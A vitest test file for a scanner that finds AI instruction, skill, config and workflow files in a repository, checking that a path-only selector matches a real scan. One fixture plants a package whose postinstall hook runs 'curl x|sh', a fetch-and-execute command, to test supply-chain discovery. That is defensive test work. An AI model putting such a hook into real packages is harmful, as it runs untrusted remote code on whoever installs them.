/**
 * selectScanPaths (pcic-zg3): a pure, filesystem-free discovery API a server
 * with only a GitHub tree listing can use to decide what a real scan would
 * read, without a checkout. These tests prove it agrees with a real scan of
 * the same files on disk: every `examples/` fixture, plus synthetic repos
 * covering edge cases a second-pass review found drifting (composite actions
 * under an ignored dir, the per-skill cap interacting with `exclude`, a
 * skill's own `node_modules`, every skill location, `include`/`exclude`
 * policy parity with `ScanInput`, and the MAX_FILE_SIZE guard).
 */

import { describe, it, expect, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  selectScanPaths,
  scanFilesWithAliases,
  discoverAiConfigFiles,
  buildRepoContext,
} from '../src/index.js';
import type { ScanPathEntry } from '../src/index.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const examplesRoot = path.resolve(here, '../../../examples');

/** Every file under `root`, as sorted repo-relative POSIX paths with real byte sizes (skips `.git`). */
function listRepoFiles(root: string): Array<{ path: string; size: number }> {
  const out: Array<{ path: string; size: number }> = [];
  const walk = (dir: string): void => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      if (entry.name === '.git') continue;
      const abs = path.join(dir, entry.name);
      if (entry.isDirectory()) walk(abs);
      else if (entry.isFile()) {
        out.push({ path: path.relative(root, abs).replace(/\\/g, '/'), size: fs.statSync(abs).size });
      }
    }
  };
  walk(root);
  return out.sort((a, b) => (a.path < b.path ? -1 : 1));
}

/** Ground truth for the instruction-file class: scanner.ts's own glob match. */
async function realInstructionFiles(
  root: string,
  policy: { include?: string[]; exclude?: string[] } = {},
): Promise<Set<string>> {
  const { files, aliases } = await scanFilesWithAliases({ repoPath: root, ...policy });
  return new Set([...files, ...aliases].map((f) => f.relativePath!));
}

/** Ground truth for the skill-file class: ai-config.ts's own discovery. */
function realSkillFiles(root: string, policy: { include?: string[]; exclude?: string[] } = {}): Set<string> {
  const aiConfig = discoverAiConfigFiles(root, policy);
  return new Set([...(aiConfig.allSkills ?? []), ...(aiConfig.skillFiles ?? [])]);
}

/**
 * Ground truth for the aiConfigFiles class: ai-config.ts's own discovery for
 * every surface it reads independently of scanner.ts (settings, MCP,
 * subagents, Cursor rules, Copilot per-file instructions).
 */
function realAiConfigFiles(root: string, policy: { include?: string[]; exclude?: string[] } = {}): Set<string> {
  const aiConfig = discoverAiConfigFiles(root, policy);
  return new Set([...aiConfig.settings, ...aiConfig.mcp, ...aiConfig.agents, ...aiConfig.cursorRules, ...aiConfig.copilotInstructions]);
}

/**
 * Ground truth for the workflow/composite-action class: `context.workflows.files`
 * lists every workflow file unconditionally (no size/exclude check — only its
 * CONTENT, read into `sources`, is gated), so that is the right field for file
 * EXISTENCE. Composite actions have no separate unconditional list, so their
 * ground truth comes from `sources` (already MAX_FILE_SIZE- and exclude-filtered
 * the same way a real read is).
 */
async function realWorkflowFiles(root: string, policy: { exclude?: string[] } = {}): Promise<Set<string>> {
  const context = await buildRepoContext({ repoPath: root, ...policy });
  const workflows = context.workflows.files.map((f) => f.replace(/\\/g, '/'));
  const composites = (context.workflows.sources ?? [])
    .map((s) => s.filePath)
    .filter((p) => !p.startsWith('.github/workflows/'));
  return new Set([...workflows, ...composites]);
}

function mkRepo(files: Record<string, string>): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'promptci-discovery-'));
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(root, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, content);
  }
  return root;
}

async function assertMatches(
  root: string,
  policy: { include?: string[]; exclude?: string[] } = {},
): Promise<void> {
  const paths: ScanPathEntry[] = listRepoFiles(root);
  const result = selectScanPaths(paths, policy);
  expect(new Set(result.instructionFiles)).toEqual(await realInstructionFiles(root, policy));
  expect(new Set(result.skillFiles)).toEqual(realSkillFiles(root, policy));
  expect(new Set(result.aiConfigFiles)).toEqual(realAiConfigFiles(root, policy));
  expect(new Set(result.workflowFiles)).toEqual(await realWorkflowFiles(root, { exclude: policy.exclude }));
}

describe('selectScanPaths vs. a real scan: every examples/ fixture', () => {
  const fixtures = fs
    .readdirSync(examplesRoot, { withFileTypes: true })
    .filter((e) => e.isDirectory())
    .map((e) => e.name)
    .sort();

  it('found every fixture directory (sanity check the list is not empty)', () => {
    expect(fixtures.length).toBeGreaterThan(10);
  });

  for (const name of fixtures) {
    it(`matches scanner/ai-config/repo-context discovery for ${name}`, async () => {
      await assertMatches(path.join(examplesRoot, name));
    });
  }
});

describe('selectScanPaths vs. a real scan: synthetic repos', () => {
  const cleanups: string[] = [];
  afterEach(() => {
    for (const dir of cleanups.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
  });
  function repo(files: Record<string, string>): string {
    const root = mkRepo(files);
    cleanups.push(root);
    return root;
  }

  it('skips composite actions under an ignored dir (build/, dist/)', async () => {
    const root = repo({
      '.github/actions/build/action.yml': 'runs: {using: composite, steps: []}',
      '.github/actions/dist/action.yml': 'x: 1',
      '.github/actions/real/action.yml': 'runs: {using: composite, steps: []}',
      'AGENTS.md': '# a',
    });
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.workflowFiles).toEqual(['.github/actions/real/action.yml']);
  });

  it('honours a negated include pattern regardless of its position in the array', async () => {
    const root = repo({ 'docs/drafts/a.md': '# a', 'docs/b.md': '# b' });
    await assertMatches(root, { include: ['!docs/drafts/**', 'docs/**/*.md'] });
    await assertMatches(root, { include: ['docs/**/*.md', '!docs/drafts/**'] });
  });

  it('narrows (does not replace) skill discovery with `include`', async () => {
    const root = repo({
      'docs/b.md': '# b',
      '.claude/skills/x/SKILL.md': '---\nname: x\n---',
      '.claude/skills/x/run.sh': 'echo',
    });
    await assertMatches(root, { include: ['docs/**/*.md'] });
    const result = selectScanPaths(listRepoFiles(root), { include: ['docs/**/*.md'] });
    expect(result.skillFiles).toEqual([]);
  });

  it('honours `exclude` for instruction files and skill bundle files', async () => {
    const root = repo({
      'AGENTS.md': '# a',
      'prompts/old/a.md': '# a',
      '.claude/skills/x/SKILL.md': '---\nname: x\n---',
      '.claude/skills/x/run.sh': 'echo',
    });
    await assertMatches(root, { exclude: ['prompts/old/**', '.claude/skills/x/run.sh'] });
  });

  it('applies `exclude` to bundle candidates BEFORE the per-skill cap', async () => {
    const files: Record<string, string> = { '.claude/skills/x/SKILL.md': '---\nname: x\n---' };
    for (let i = 0; i < 200; i++) files[`.claude/skills/x/aaa/${String(i).padStart(3, '0')}.sh`] = 'echo';
    files['.claude/skills/x/zz.sh'] = 'echo';
    const root = repo(files);
    await assertMatches(root, { exclude: ['.claude/skills/x/aaa/000.sh'] });
    const result = selectScanPaths(listRepoFiles(root), { exclude: ['.claude/skills/x/aaa/000.sh'] });
    // freed by the exclude, zz.sh now fits under the 200 cap
    expect(result.skillFiles).toContain('.claude/skills/x/zz.sh');
  });

  it('harvests a skill\'s own node_modules/<pkg>/package.json manifests', async () => {
    const root = repo({
      '.claude/skills/x/SKILL.md': '---\nname: x\n---',
      '.claude/skills/x/node_modules/evil/package.json': '{"scripts":{"postinstall":"curl x|sh"}}',
      '.claude/skills/x/node_modules/@scope/pkg/package.json': '{}',
    });
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.skillFiles).toContain('.claude/skills/x/node_modules/evil/package.json');
    expect(result.skillFiles).toContain('.claude/skills/x/node_modules/@scope/pkg/package.json');
  });

  it('caps node_modules manifests at MAX_DEPENDENCY_MANIFESTS (100) per skill', async () => {
    const files: Record<string, string> = { '.claude/skills/x/SKILL.md': '---\nname: x\n---' };
    for (let i = 0; i < 150; i++) {
      files[`.claude/skills/x/node_modules/pkg-${String(i).padStart(3, '0')}/package.json`] = '{}';
    }
    const root = repo(files);
    await assertMatches(root);
  });

  it('discovers skills in every supported location', async () => {
    const root = repo({
      '.claude/skills/a/SKILL.md': '---\nname: a\n---',
      '.agents/skills/b/SKILL.md': '---\nname: b\n---',
      'skills/c/SKILL.md': '---\nname: c\n---',
      'plugins/p/skills/d/SKILL.md': '---\nname: d\n---',
    });
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.skillFiles.sort()).toEqual([
      '.agents/skills/b/SKILL.md',
      '.claude/skills/a/SKILL.md',
      'plugins/p/skills/d/SKILL.md',
      'skills/c/SKILL.md',
    ]);
  });

  it('assigns a nested skill\'s files to the nested skill, not its parent', async () => {
    const root = repo({
      '.claude/skills/outer/SKILL.md': '---\nname: outer\n---',
      '.claude/skills/outer/notes.md': 'outer notes',
      '.claude/skills/outer/inner/SKILL.md': '---\nname: inner\n---',
      '.claude/skills/outer/inner/notes.md': 'inner notes',
    });
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.skillFiles).toContain('.claude/skills/outer/notes.md');
    expect(result.skillFiles).toContain('.claude/skills/outer/inner/notes.md');
  });

  it('reads a real root package.json as a context file, not an instruction file', async () => {
    const root = repo({ 'AGENTS.md': '# a', 'package.json': '{"name":"x","scripts":{"build":"tsc"}}' });
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.contextFiles).toEqual(['package.json']);
    expect(result.instructionFiles).toEqual(['AGENTS.md']);
  });

  it('drops an oversized instruction file and composite action, but not an oversized workflow', () => {
    const root = repo({
      'AGENTS.md': '#',
      '.github/workflows/big.yml': 'a: 1',
      'action.yml': 'runs: {using: composite, steps: []}',
    });
    const paths = listRepoFiles(root).map((p) => ({
      ...p,
      size: p.path === 'AGENTS.md' || p.path === 'action.yml' ? 600_000 : p.size,
    }));
    fs.rmSync(root, { recursive: true, force: true });
    const result = selectScanPaths(paths);
    expect(result.instructionFiles).toEqual([]);
    expect(result.workflowFiles).toEqual(['.github/workflows/big.yml']);
  });

  it('normalizes a leading ./ and backslashes, and de-duplicates the two spellings of one path', () => {
    const result = selectScanPaths(['./AGENTS.md', 'AGENTS.md', '.claude\\skills\\x\\SKILL.md']);
    // A SKILL.md also matches the scanner's own `.claude/**/*.md` instruction
    // pattern — real core double-classifies it too (see the fixture tests
    // above), so it is expected in both buckets.
    expect(result.instructionFiles).toEqual(['.claude/skills/x/SKILL.md', 'AGENTS.md']);
    expect(result.skillFiles).toEqual(['.claude/skills/x/SKILL.md']);
  });

  it('excludes symlinked entries from skills and workflows (not from instructionFiles, which core aliases instead)', () => {
    const result = selectScanPaths([
      { path: '.claude/skills/x/SKILL.md', symlink: true },
      { path: '.github/workflows/ci.yml', symlink: true },
      'AGENTS.md',
    ]);
    expect(result.skillFiles).toEqual([]);
    expect(result.workflowFiles).toEqual([]);
  });
});

describe('selectScanPaths: aiConfigFiles', () => {
  const cleanups: string[] = [];
  afterEach(() => {
    for (const dir of cleanups.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
  });

  it('finds Claude settings and .mcp.json, separately from instructionFiles/skillFiles', async () => {
    const root = mkRepo({
      '.claude/settings.json': '{}',
      '.claude/settings.local.json': '{}',
      '.mcp.json': '{}',
      'AGENTS.md': '# a',
    });
    cleanups.push(root);
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.aiConfigFiles.sort()).toEqual(['.claude/settings.json', '.claude/settings.local.json', '.mcp.json']);
    expect(result.instructionFiles).toEqual(['AGENTS.md']);
  });
});

describe('selectScanPaths: contextFiles', () => {
  it('finds the manifests/ignore files repo-context.ts reads for resolution (fixture-monorepo-scripts)', () => {
    const root = path.join(examplesRoot, 'fixture-monorepo-scripts');
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.contextFiles).toEqual(['apps/web/package.json', 'package.json', 'pnpm-workspace.yaml']);
  });

  it('finds .promptci/custom-rules.json (fixture-custom-rules)', () => {
    const root = path.join(examplesRoot, 'fixture-custom-rules');
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.contextFiles).toEqual(['.promptci/custom-rules.json']);
    expect(result.instructionFiles).toEqual(['CLAUDE.md']);
  });

  it('finds a non-root Makefile and the root .gitignore (fixture-stale-paths)', () => {
    const root = path.join(examplesRoot, 'fixture-stale-paths');
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.contextFiles).toEqual(['.gitignore', 'Makefile', 'package.json', 'tools/Makefile']);
  });

  it('separates root package.json (context) from skill files (fixture-skill-supply-chain)', () => {
    const root = path.join(examplesRoot, 'fixture-skill-supply-chain');
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.skillFiles).toContain('.claude/skills/deploy-helper/SKILL.md');
    expect(result.skillFiles).toContain('.claude/skills/deploy-helper/scripts/setup.sh');
    expect(result.skillFiles).toContain('.claude/skills/pdf-forms/package.json');
    expect(result.contextFiles).not.toContain('.claude/skills/pdf-forms/package.json');
  });
});

describe('selectScanPaths: re-review fixes (pcic-zg3)', () => {
  const cleanups: string[] = [];
  afterEach(() => {
    for (const dir of cleanups.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
  });
  function repo(files: Record<string, string>): string {
    const root = mkRepo(files);
    cleanups.push(root);
    return root;
  }

  it('does not cap nested package.json: a declared workspace package plus 250 others outside it must all be listed', async () => {
    const files: Record<string, string> = {
      'package.json': JSON.stringify({ name: 'root', private: true, workspaces: ['packages/*'] }),
      'packages/a/package.json': JSON.stringify({ name: 'a', dependencies: { zod: '^3.0.0' } }),
      'CLAUDE.md': '# Stack\n\n- Run `cd packages/a && npm run build`.\n',
    };
    for (let i = 0; i < 250; i++) files[`examples/e${String(i).padStart(3, '0')}/package.json`] = JSON.stringify({ name: `e${i}` });
    const root = repo(files);
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.contextFiles).toContain('packages/a/package.json');
    expect(result.contextFiles).toContain('examples/e249/package.json');
    expect(result.contextFiles.filter((p) => p.endsWith('/package.json')).length).toBe(251);
  });

  it('finds a Makefile reachable only via `make -C dir` under a directory scanner.ts otherwise ignores (build/, bin/)', async () => {
    const root = repo({
      'CLAUDE.md': '# Build\n\n- Run `make -C build all`.\n- Run `cd bin && make test`.\n',
      'build/Makefile': 'all:\n\techo hi\n',
      'bin/Makefile': 'test:\n\techo hi\n',
    });
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.contextFiles.sort()).toEqual(['bin/Makefile', 'build/Makefile']);
  });

  it('still excludes a Makefile under node_modules/.git', () => {
    const result = selectScanPaths(['node_modules/pkg/Makefile', '.git/hooks/Makefile', 'Makefile']);
    expect(result.contextFiles).toEqual(['Makefile']);
  });

  it('finds subagent/Cursor-rule/Copilot-instruction files under bin/obj/Library/Temp as aiConfigFiles, not instructionFiles', async () => {
    const root = repo({
      '.claude/agents/bin/a.md': '# agent',
      '.cursor/rules/Temp/r.mdc': 'rule',
      '.github/instructions/obj/i.instructions.md': 'instr',
    });
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.aiConfigFiles.sort()).toEqual([
      '.claude/agents/bin/a.md',
      '.cursor/rules/Temp/r.mdc',
      '.github/instructions/obj/i.instructions.md',
    ]);
    expect(result.instructionFiles).toEqual([]);
  });

  it('a subagent outside those four dirs appears in both instructionFiles and aiConfigFiles', async () => {
    const root = repo({ '.claude/agents/reviewer.md': '# reviewer' });
    await assertMatches(root);
    const result = selectScanPaths(listRepoFiles(root));
    expect(result.instructionFiles).toEqual(['.claude/agents/reviewer.md']);
    expect(result.aiConfigFiles).toEqual(['.claude/agents/reviewer.md']);
  });

  it('prunes a bare multi-segment exclude directory (fast-glob\'s own ignore-option rule)', async () => {
    const root = repo({
      'CLAUDE.md': '# x',
      '.claude/skills/foo/SKILL.md': '---\nname: foo\n---',
      '.claude/skills/foo/ref.md': 'ref',
    });
    await assertMatches(root, { exclude: ['.claude/skills/foo'] });
    const result = selectScanPaths(listRepoFiles(root), { exclude: ['.claude/skills/foo'] });
    expect(result.instructionFiles).toEqual(['CLAUDE.md']);
    expect(result.skillFiles).toEqual([]);
  });

  it('a bare SINGLE-segment exclude does not prune (matches fast-glob\'s ignore-option behavior exactly, over-fetch and all)', async () => {
    const root = repo({ 'CLAUDE.md': '# x', 'prompts/a.md': '# a' });
    // Real core does not prune here either — this asserts parity, not correctness.
    await assertMatches(root, { exclude: ['prompts'] });
  });

  it('prunes a bare negated directory inside `include` (fast-glob\'s in-pattern `!` rule, which IS single-segment-safe)', async () => {
    const root = repo({ 'prompts/a.md': '# a', 'prompts/sub/b.md': '# b', 'README.md': '# r' });
    await assertMatches(root, { include: ['**/*.md', '!prompts'] });
    const result = selectScanPaths(listRepoFiles(root), { include: ['**/*.md', '!prompts'] });
    expect(result.instructionFiles).toEqual(['README.md']);
  });

  it('does not filter manifests already inside a skill\'s node_modules by an unrelated-looking `exclude: ["**/package.json"]`', async () => {
    const root = repo({
      '.claude/skills/foo/SKILL.md': '---\nname: foo\n---',
      '.claude/skills/foo/node_modules/a/package.json': '{}',
      '.claude/skills/foo/node_modules/b/package.json': '{}',
    });
    await assertMatches(root, { exclude: ['**/package.json'] });
    const result = selectScanPaths(listRepoFiles(root), { exclude: ['**/package.json'] });
    expect(result.skillFiles).toContain('.claude/skills/foo/node_modules/a/package.json');
    expect(result.skillFiles).toContain('.claude/skills/foo/node_modules/b/package.json');
  });

  it('still excludes a skill\'s node_modules dir when exclude matches the dir itself', async () => {
    const root = repo({
      '.claude/skills/foo/SKILL.md': '---\nname: foo\n---',
      '.claude/skills/foo/node_modules/a/package.json': '{}',
    });
    await assertMatches(root, { exclude: ['.claude/skills/foo/node_modules'] });
    const result = selectScanPaths(listRepoFiles(root), { exclude: ['.claude/skills/foo/node_modules'] });
    expect(result.skillFiles).not.toContain('.claude/skills/foo/node_modules/a/package.json');
  });
});

describe('selectScanPaths: determinism', () => {
  it('returns every class sorted', () => {
    const root = path.join(examplesRoot, 'fixture-skill-supply-chain');
    const result = selectScanPaths(listRepoFiles(root));
    for (const key of ['instructionFiles', 'skillFiles', 'aiConfigFiles', 'workflowFiles', 'contextFiles'] as const) {
      const list = result[key];
      expect(list).toEqual([...list].sort());
    }
  });

  it('accepts bare path strings and {path, size} entries identically', () => {
    const root = path.join(examplesRoot, 'fixture-basic');
    const files = listRepoFiles(root);
    const plain = selectScanPaths(files.map((f) => f.path));
    const withSizes = selectScanPaths(files);
    expect(withSizes).toEqual(plain);
  });
});
